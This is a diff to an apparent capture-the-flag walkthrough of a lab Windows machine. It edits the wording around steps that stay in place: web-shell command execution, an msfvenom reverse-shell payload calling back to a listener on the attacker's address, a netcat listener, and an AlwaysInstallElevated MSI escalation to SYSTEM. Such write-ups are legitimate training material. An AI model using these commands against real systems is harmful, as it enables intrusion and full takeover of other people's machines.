@@ -58,7 +58,7 @@ def read_file(f, end=None):
 $ curl 'http://10.10.10.239/images/rev.php?cmd=type%20C:\Users\phoebe\Desktop\user.txt'
 XXXXXXXXXXXXXXXXXXXXXX
 ```
-6. Get shell use following command
+6. Upload a windows exe reverse shell, then use php RCE to execute it, then get the sweety reverse shell and get user flag.
 ```
 $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=13337 -f exe > reverse.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -66,8 +66,11 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=13337 -f exe > re
 No encoder specified, outputting raw payload
 Payload size: 324 bytes
 Final size of exe file: 73802 bytes
+
 # upload reverse.exe
+
 # visit http://10.10.10.239/images/rev.php?cmd=.\reverse.exe 
+
 $ nc -lvnp 13337
 Listening on 0.0.0.0 13337
 Connection received on 10.10.10.239 54473
@@ -78,7 +81,7 @@ C:\xampp\htdocs\omrs\images>
 ```
 
 ### Root
-1. Run `winPEASx64.exe` shows that there is AlwaysInstallElevated vulnerability. So generate the payload via `msfvenom`, then install the .msi on the remote to get SYSTEM reverse shell. Install msi takes time, be patient.
+1. Run `winPEASx64.exe` shows that there is AlwaysInstallElevated vulnerability. So generate the payload using `msfvenom`, then install the `.msi` on the remote to get SYSTEM reverse shell. Install msi takes time, be patient.
 ```
 # Remote
 > .\winPEASx64.exe
@@ -123,5 +126,5 @@ Microsoft Windows [Version 10.0.19042.867]
 C:\WINDOWS\system32>whoami
 nt authority\system
 ```
-
+2 Get root flag!
  
